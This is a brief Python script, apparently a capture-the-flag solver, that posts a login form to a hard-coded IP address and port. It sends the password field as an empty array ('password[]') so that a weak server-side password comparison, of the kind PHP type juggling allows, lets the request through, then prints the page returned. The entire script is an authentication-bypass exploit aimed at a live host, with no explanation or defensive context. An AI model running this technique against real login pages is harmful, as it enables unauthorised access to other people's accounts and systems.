import requests
from bs4 import BeautifulSoup

url = 'http://165.22.245.125:7070/'

data = {
    "password[]" : "",
}

response = requests.post(url, data=data)
print(response.text)